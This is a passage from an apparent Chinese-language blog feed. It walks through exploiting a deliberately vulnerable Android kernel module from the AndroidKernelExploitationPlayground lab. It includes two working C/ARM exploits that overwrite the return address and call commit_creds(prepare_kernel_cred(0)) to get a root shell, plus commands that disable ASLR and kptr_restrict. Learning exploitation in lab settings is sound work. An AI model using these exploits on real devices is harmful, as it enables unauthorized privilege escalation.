*data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LENGTH];</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(&amp;buf, ubuf, count)) &#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;stackBufferProcEntry: error copying data from userspacen&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">stack_buffer_proc_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    stack_buffer_proc_entry = create_proc_entry(<span class="string">&quot;stack_buffer_overflow&quot;</span>, <span class="number">0666</span>, <span class="literal">NULL</span>);</span><br><span class="line">    stack_buffer_proc_entry-&gt;write_pr = proc_entry_write;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;created /proc/stack_buffer_overflown&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> __exit <span class="title">stack_buffer_proc_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stack_buffer_proc_entry) &#123;</span><br><span class="line">        remove_proc_entry(<span class="string">&quot;stack_buffer_overflow&quot;</span>, stack_buffer_proc_entry);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;vuln_stack_proc_entry removedn&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">module_init(stack_buffer_proc_init);</span><br><span class="line">module_exit(stack_buffer_proc_exit);</span><br></pre></td></tr></table></figure><h1 id="使用adb-shell连接到自己的模拟器"><a href="#使用adb-shell连接到自己的模拟器" class="headerlink" title="使用adb shell连接到自己的模拟器"></a>使用adb shell连接到自己的模拟器</h1><p>如果没有装adb就使用apt安装一个<br>在之前配置环境时，我们用下面的命令创建了一个模拟器</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">android create avd --force -t <span class="string">&quot;android-19&quot;</span> -n kernel_challenges</span><br></pre></td></tr></table></figure><p>安卓SDK常用命令可以参考这个链接<br><a href="https://blog.csdn.net/w00347190/article/details/102054184">https://blog.csdn.net/w00347190/article/details/102054184</a></p><p>然后我们使用<code>adb devices</code>查看一下模拟器的名称<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/1.jpg" alt><br>接下来就adb -s [名称] shell<br>即可连接到模拟器shell<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/2.jpg" alt></p><h1 id="测试是否存在溢出"><a href="#测试是否存在溢出" class="headerlink" title="测试是否存在溢出"></a>测试是否存在溢出</h1><p>从代码可以看出，调用create_proc_entry函数创建了一个/proc/stack_buffer_overflow的设备文件，当向该设备文件调用 write 系统调用时会调用 proc_entry_write 函数进行处理。proc_entry_write调用copy_from_user函数，但是调用的参数全是由proc_entry_write传入的，因此我们可以输入超过64字节来进行缓冲区溢出。<br>于是我们进行测试，向/proc/stack_buffer_overflow写72个A看看是否能将返回值覆盖掉，如果成功，pc应该是A的ascii重复。（这里需要一点arm的汇编基础，没有的话希望尽早补全知识结构）<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/3.jpg" alt><br>可以看到成功的溢出了，PC被覆盖，并且adbshell也卡死了。</p><h1 id="溢出准备"><a href="#溢出准备" class="headerlink" title="溢出准备"></a>溢出准备</h1><p>首先关闭ASLR</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br></pre></td></tr></table></figure><p>然后关闭kptr_restrict</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;kptr_restrict</span><br></pre></td></tr></table></figure><p>否则将无法获取内核符号地址。<br>实际上，在更后期的安卓内核版本里，是根本无法获取内核符号的，这使得漏洞利用变得更难了。<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/4.jpg" alt><br>然后我们就可以找commit_creds 和 prepare_kernel_cred的地址了，通过调用这两个程序来进行提权。<br>命令是</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;kallsyms | grep prepare_kernel_cred  </span><br><span class="line">cat &#x2F;proc&#x2F;kallsyms | grep commit_creds </span><br></pre></td></tr></table></figure><p>具体的思路就是</p><ol><li>调用 commit_creds（prepare_kernel_cred（0）） 提升权限</li><li>调用 mov r3, ＃0x40000010; MSR CPSR_c, R3;设置 cpsr 寄存器， 使cpu进入用户模式</li><li>然后执行 execl(“/system/bin/sh”,”sh”，NULL);起一个 root 权限的 shell</li></ol><p>我们就可以抄playground里给我们的solution了</p><h1 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX             64</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> * prepare_kernel_cred;</span><br><span class="line"><span class="keyword">void</span> * commit_creds;</span><br><span class="line"><span class="keyword">void</span> * proc_file_write;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> *</span><br><span class="line">get_ksymbol(<span class="keyword">char</span> *name)</span><br><span class="line">&#123;</span><br><span class="line">        FILE *f = fopen(<span class="string">&quot;/proc/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">char</span> c, sym[<span class="number">512</span>];</span><br><span class="line">        <span class="keyword">void</span> *addr;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="built_in">fscanf</span>(f, <span class="string">&quot;%p %c %s\n&quot;</span>, &amp;addr, &amp;c, sym) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(sym, name))</span><br><span class="line">                        <span class="keyword">return</span> addr;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">open_file(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/stack_buffer_overflow&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">payload(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] enjoy the shell\n&quot;</span>);</span><br><span class="line">                execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                warnx(<span class="string">&quot;failed to get root. How did we even get here?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> shellCode[];</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span></span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;    .text\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .align 2\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .code 32\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .globl shellCode\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;shellCode:\n\t&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">// -&gt; get root</span></span><br><span class="line"><span class="string">&quot;LDR     R3, =0xc003c814\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;MOV     R0, #0\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;LDR     R3, =0xc003c310\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Fix the trashed stack by restoring r4/r5 from duped values on the stack</span></span><br><span class="line"><span class="string">&quot;ldr r0, =0xc0104610\t\n&quot;</span></span><br><span class="line"><span class="string">&quot;ldr r4, [sp] \t\n&quot;</span></span><br><span class="line"><span class="string">&quot;ldr r5, [sp, #4]\t\n&quot;</span></span><br><span class="line"><span class="string">&quot;bx r0\t\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">trigger_vuln(<span class="keyword">int</span> fd, <span class="keyword">int</span> canary)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD (MAX + 4  * sizeof(void*) )</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">char</span> buf[MAX_PAYLOAD];</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">void</span> * pc = buf + MAX +  <span class="number">3</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span>*);</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">void</span> **)pc  = (<span class="keyword">void</span> *) shellCode;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Kaboom! */</span></span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">gather_information(<span class="keyword">int</span> fd)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">int</span> canary, i;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lseek(fd, <span class="number">32</span>, SEEK_SET) == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">2</span>, <span class="string">&quot;lseek&quot;</span>);</span><br><span class="line">        read(fd, &amp;canary, <span class="keyword">sizeof</span>(canary));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] found canary: %08x\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> canary;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">resolve_kernel_symbols(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        prepare_kernel_cred     = get_ksymbol(<span class="string">&quot;prepare_kernel_cred&quot;</span>);</span><br><span class="line">        commit_creds            = get_ksymbol(<span class="string">&quot;commit_creds&quot;</span>);</span><br><span class="line">        proc_file_write         = get_ksymbol(<span class="string">&quot;proc_file_write&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!prepare_kernel_cred || !commit_creds)</span><br><span class="line">                errx(<span class="number">1</span>, <span class="string">&quot;couldn&#x27;t map all kernel symbols&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="keyword">int</span> fd, canary;</span><br><span class="line"></span><br><span class="line">        resolve_kernel_symbols();</span><br><span class="line"></span><br><span class="line">        fd = open_file();</span><br><span class="line">        canary = gather_information(fd);</span><br><span class="line"></span><br><span class="line">        trigger_vuln(fd, canary);</span><br><span class="line"></span><br><span class="line">        payload();</span><br><span class="line">        <span class="comment">/* If we&#x27;re here, we&#x27;ve failed. */</span></span><br><span class="line">        close(fd);</span><br><span class="line"></span><br><span class="line">        errx(<span class="string">&quot;[-] exploit failed\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里面有找内核符号的函数，获取proc的函数，构造shellcode的函数等等。<br>不过实际上经过我们的分析和操作，实际上只需要这些代码的一部分就够了，比如找符号的那一部分就可以不要了。而且这个solution其实本身就有坑，max_payload和pc跳转的位置都8一样，直接跑的话就反手给你来一个pc=AAAAAAA，当场自闭。这里我们可以抄另一个大佬改的。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX             64</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open_file</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd = open(<span class="string">&quot;/proc/stack_buffer_overflow&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="keyword">if</span> (fd == <span class="number">-1</span>)</span><br><span class="line">                err(<span class="number">1</span>, <span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> fd;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[+] enjoy the shell\n&quot;</span>);</span><br><span class="line">                execl(<span class="string">&quot;/system/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">uint32_t</span> shellCode[];</span><br><span class="line"><span class="keyword">asm</span></span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;    .text\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .align 2\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .code 32\n&quot;</span></span><br><span class="line"><span class="string">&quot;    .globl shellCode\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;shellCode:\n\t&quot;</span></span><br><span class="line"><span class="comment">// commit_creds(prepare_kernel_cred(0));</span></span><br><span class="line"><span class="comment">// -&gt; get root</span></span><br><span class="line"><span class="string">&quot;LDR     R3, =0xc0039d34\n\t&quot;</span>   <span class="comment">//prepare_kernel_cred addr</span></span><br><span class="line"><span class="string">&quot;MOV     R0, #0\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;LDR     R3, =0xc0039834\n\t&quot;</span>   <span class="comment">//commit_creds addr</span></span><br><span class="line"><span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;mov r3, #0x40000010\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;MSR    CPSR_c,R3\n\t&quot;</span></span><br><span class="line"><span class="string">&quot;LDR     R3, =0x84c8\n\t&quot;</span>     <span class="comment">// payload function addr</span></span><br><span class="line"><span class="string">&quot;BLX     R3\n\t&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trigger_vuln</span><span class="params">(<span class="keyword">int</span> fd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="meta">#<span class="meta-keyword">define</span> MAX_PAYLOAD (MAX + 2  * sizeof(void*) )</span></span><br><span class="line">        <span class="keyword">char</span> buf[MAX_PAYLOAD];</span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="string">&#x27;A&#x27;</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="keyword">void</span> * pc = buf + MAX +  <span class="number">1</span> * <span class="keyword">sizeof</span>(<span class="keyword">void</span>*);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;shellcdoe addr: %p\n&quot;</span>, shellCode);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;payload:%p\n&quot;</span>, payload);</span><br><span class="line">        *(<span class="keyword">void</span> **)pc  = (<span class="keyword">void</span> *) shellCode;   <span class="comment">//ret addr</span></span><br><span class="line">        <span class="comment">/* Kaboom! */</span></span><br><span class="line">        write(fd, buf, <span class="keyword">sizeof</span>(buf) );</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> fd;</span><br><span class="line">        fd = open_file();</span><br><span class="line">        trigger_vuln(fd);</span><br><span class="line">        payload();</span><br><span class="line">        close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在arm架构下，函数栈如下<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/7.png" alt><br>可以看到，除了main函数外，栈里是没有参数，而只有本地变量，其实这也不对，实际上，当要传的参数小于4时，参数会被保存在r0，r1，r2，而当大于4时，大于4的部分则需要使用堆栈。、<br>但是我们这里的buf是本地变量，实际上也是上图中para1的位置，也因此我们只需加上两个指令长度即可找到覆盖sp的位置。</p><h1 id="编译利用代码"><a href="#编译利用代码" class="headerlink" title="编译利用代码"></a>编译利用代码</h1><p>在这里你可能遇到找不到各种各样的头文件的错误，大致的解决方案有二。</p><h2 id="使用NDK的ndk-build"><a href="#使用NDK的ndk-build" class="headerlink" title="使用NDK的ndk-build"></a>使用NDK的ndk-build</h2><p>首先我们去下载一个NDK，地址是<br><a href="https://developer.android.google.cn/ndk/downloads">https://developer.android.google.cn/ndk/downloads</a><br>选择下载linux版本，直接unzip出来，然后配置环境变量</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">NDKROOT&#x3D;&quot;&#x2F;your&#x2F;path&#x2F;android-ndk-r21d&#x2F;&quot;</span><br><span class="line">export PATH&#x3D;&quot;$NDKROOT:$PATH&quot;</span><br></pre></td></tr></table></figure><p>如果你选择的是ndkr21d的话，你就需要了解一下NDK的使用方式，使用ndk-build来生成编译的文件，而不能使用–sysroot<br>然后我们去solution那儿试着ndk-build一下<br>会出现报错，这里我们需要修改一下Application.mk，修改后的内容如下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOCAL_PATH :&#x3D; $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;修改了这一行</span><br><span class="line">APP_ABI :&#x3D; armeabi-v7a</span><br><span class="line"></span><br><span class="line">LOCAL_EXPORT_C_INCLUDE_DIRS :&#x3D; $(LOCAL_PATH)&#x2F;include</span><br><span class="line">LOCAL_C_INCLUDES :&#x3D; $(LOCAL_PATH)&#x2F;include-all</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;加上了这两行</span><br><span class="line">APP_PLATFORM :&#x3D; android-19</span><br><span class="line">APP_ALLOW_MISSING_DEPS&#x3D;true</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br></pre></td></tr></table></figure><p>在jni上一层目录执行ndk-build，就可以在solution/obj/local/armeabi-v7a下找到对应的可执行文件，把它使用adb整到模拟器里再运行即可</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push filetopush path&#x2F;in&#x2F;emulator&#x2F;filename</span><br></pre></td></tr></table></figure><p>如果他提示你文件系统只读，那么只需要在adbshell里执行</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o remount rw &#x2F;</span><br></pre></td></tr></table></figure><p>即可</p><h2 id="利用ndk的头文件和库文件"><a href="#利用ndk的头文件和库文件" class="headerlink" title="利用ndk的头文件和库文件"></a>利用ndk的头文件和库文件</h2><p>这里得要一个更早一点的ndk，比如ndkr13b，反正最新的ndk的是用不了的。<br>使用下面的命令</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gcc --sysroot=/your/path/android-ndk-r13b/platforms/android-19/arch-arm /home/bbs/android/try/exp.c -o exp</span><br></pre></td></tr></table></figure><p>同样，用adb整到模拟器里运行即可。</p><h1 id="远程调试"><a href="#远程调试" class="headerlink" title="远程调试"></a>远程调试</h1><p>首先在linux上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb forward tcp:12345 tcp:12345</span><br></pre></td></tr></table></figure><p>然后到adb shell里在程序对应的位置 </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gdbserver :12345 .&#x2F;exp</span><br></pre></td></tr></table></figure><p>然后再在物理机上，到goldfish目录下</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">arm-linux-androideabi-gdb vmlinux</span><br></pre></td></tr></table></figure><p>在打开的gdb里使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">target remote:12345</span><br></pre></td></tr></table></figure><p>就可以调试安卓模拟器里的程序了。<br>理论上这里可以很快乐的调试，但是由于不知名原因，即便我填上了sysroot，GDB依旧无法加载动态库的符号表，所以出来的都是乱七八糟的，不过问题不大。可以通过看寄存器内容来修改shellcode的地址。</p><h1 id="修改代码"><a href="#修改代码" class="headerlink" title="修改代码"></a>修改代码</h1><p>我们直接使用大佬改好的代码，运行之后发现会出错，（当你发现你的grep prepare_kernel_cred和grep commit_creds地址和教程一样时，并不意味着人家的代码可以直接套，我又一次领悟了这道理），在gdb里看是访问了一个0x0的地址。仔细一看就是payload地址指歪了。。。<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/5.jpg" alt><br>修改一下就可以了。</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p>先用su把我们的用户权限变低，然后直接干他。<br>（别忘了要把这个东西所在目录的权限变成777，以及这个东西本身变成777）<br><img src="/2020/07/22/%E5%AE%89%E5%8D%93%E5%86%85%E6%A0%B8pwn%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/6.jpg" alt><br>执行完毕之后发现我们又回到了root到此就任务完成辣！</p><p>参考链接<br><a href="https://www.anquanke.com/post/id/86617">https://www.anquanke.com/post/id/86617</a><br><a href="https://www.jianshu.com/p/a81e1dc52a1c">https://www.jianshu.com/p/a81e1dc52a1c</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;导语&quot;&gt;&lt;a href=&quot;#导语&quot; class=&quot;headerlink&quot; title=&quot;导语&quot;&gt;&lt;/a&gt;导语&lt;/h1&gt;&lt;p&gt;AndroidKernelExploitationPlayground之kernel_exploit_challenges / challenge / stack_buffer_overflow / module / stack_buffer_overflow.c&lt;/p&gt;</summary>
    
    
    
    
    <category term="pwn" scheme="https://blog.pillar.fun/tags/pwn/"/>
    
    <category term="android" scheme="https://blog.pillar.fun/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>PlayWithAndroidKernel</title>
    <link href="https://blog.pillar.fun/2020/07/19/PlayWithAndroidKernel/"/>
    <id>https://blog.pillar.fun/2020/07/19/PlayWithAndroidKernel/</id>
    <published>2020-07-19T04:02:18.000Z</published>
    <updated>2022-02-12T10:45:11.349Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>Do you want to hack Android？</p><a id="more"></a><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>初学Android内核漏洞，github上的<a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">AndroidKernelExploitationPlayground</a>是一个很不错的选择，虽然他还是安装4.4.2的内核，但是帮助我们理解的话还是很有价值的。<br>我在我的Ubuntu16.04上配置，如果你的步骤有出入建议查找其他教程~<br>配置AndroidKernelExploitationPlayground的环境基本可以分为一下步骤</p><ol><li>下载goldfish源码</li><li>下载AndroidKernelExploitationPlayground</li><li>使用AndroidKernelExploitationPlayground的patch将有漏洞的内核模块加到goldfish的源码</li><li>安装交叉编译工具arm-linux-androideabi-4.6</li><li>编译虚拟机</li><li>下载安装对应版本的Androidsdk</li><li>以goldfish启动虚拟机</li></ol><h2 id="下载goldfish源码"><a href="#下载goldfish源码" class="headerlink" title="下载goldfish源码"></a>下载goldfish源码</h2><p>goldfish是安卓的模拟器平台内核的源码，安卓内核有许多的代码项目，目的是适配不同的平台，比如在 <a href>https://android.googlesource.com/kernel/ </a>中我们还可以看到omap源码，即是适用于omap（Open Multimedia Application Platform）平台的。由于我们要在qemu上模拟，因此下载适用于模拟器的goldfish源码编译。</p><p>在<a href="https://github.com/Fuzion24/AndroidKernelExploitationPlayground">AndroidKernelExploitationPlayground</a>的README中，有给我们一个地址，如果有梯子的话直接复制他的命令就成了，速度也比较可观。不过用国内的源速度应该更起飞一点。没梯子的话建议去整一个。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://aosp.tuna.tsinghua.edu.cn/kernel/goldfish.git</span><br></pre></td></tr></table></figure><p>clone完了你可能会发现里面没有东西，之后的git checkout和git am会把代码放进来的，莫慌。</p><h2 id="下载AndroidKernelExploitationPlayground"><a href="#下载AndroidKernelExploitationPlayground" class="headerlink" title="下载AndroidKernelExploitationPlayground"></a>下载AndroidKernelExploitationPlayground</h2><p>这个也不是很大，速度也还好，直接clone</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Fuzion24&#x2F;AndroidKernelExploitationPlayground.git kernel_exploit_challenges</span><br></pre></td></tr></table></figure><p><em>注意</em> goldfish和kernel_exploit_challenges需要放在同一个目录下，如果不在的话后面的环境变量需要根据你放的位置进行相应的更改。</p><h2 id="使用AndroidKernelExploitationPlayground的patch将有漏洞的内核模块加到goldfish源码"><a href="#使用AndroidKernelExploitationPlayground的patch将有漏洞的内核模块加到goldfish源码" class="headerlink" title="使用AndroidKernelExploitationPlayground的patch将有漏洞的内核模块加到goldfish源码"></a>使用AndroidKernelExploitationPlayground的patch将有漏洞的内核模块加到goldfish源码</h2><p>和项目的README里面说的一样，把命令复制过去就行了（在goldfish上层的目录执行）</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> goldfish &amp;&amp; git checkout -t origin/android-goldfish-3.4 &amp;&amp; \</span><br><span class="line">git am --signoff &lt; ../kernel_exploit_challenges/kernel_build/debug_symbols_and_challenges.patch &amp;&amp; \</span><br><span class="line"><span class="built_in">cd</span> .. &amp;&amp; ln -s $(<span class="built_in">pwd</span>)/kernel_exploit_challenges/ goldfish/drivers/vulnerabilities</span><br></pre></td></tr></table></figure><h2 id="安装交叉编译工具arm-linux-androideabi-4-6"><a href="#安装交叉编译工具arm-linux-androideabi-4-6" class="headerlink" title="安装交叉编译工具arm-linux-androideabi-4.6"></a>安装交叉编译工具arm-linux-androideabi-4.6</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> 